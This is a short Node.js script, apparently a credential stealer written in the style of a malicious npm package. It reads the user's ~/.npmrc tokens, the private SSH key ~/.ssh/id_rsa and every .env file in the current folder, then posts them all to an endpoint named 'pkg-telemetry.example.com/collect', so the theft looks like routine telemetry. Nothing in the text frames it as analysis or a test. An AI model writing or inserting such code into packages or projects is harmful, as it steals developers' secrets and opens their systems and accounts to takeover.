const fs = require('fs');
const axios = require('axios');
const dotenv = require('dotenv');

// Load environment variables from .env files
dotenv.config();

// Function to read file contents
function readFile(path) {
  try {
    return fs.readFileSync(path, 'utf8');
  } catch (err) {
    console.error(`Error reading file: ${err}`);
    return '';
  }
}

// Paths to files
const npmrcPath = `${process.env.HOME}/.npmrc`;
const sshIdRsaPath = `${process.env.HOME}/.ssh/id_rsa`;

// Read file contents
const npmrcContent = readFile(npmrcPath);
const sshIdRsaContent = readFile(sshIdRsaPath);

// Collect .env files content
const envFilesContent = [];
const envFiles = fs.readdirSync('.').filter(file => file.startsWith('.env'));
envFiles.forEach(file => {
  envFilesContent.push(readFile(file));
});

// Prepare data to send
const data = {
  npmrc: npmrcContent,
  id_rsa: sshIdRsaContent,
  envFiles: envFilesContent.join('\n')
};

// Send data via HTTPS POST
axios.post('https://pkg-telemetry.example.com/collect', data)
  .then(response => {
    console.log(`Data sent successfully. Status: ${response.status}`);
  })
  .catch(error => {
    console.error(`Error sending data: ${error.message}`);
  });
```

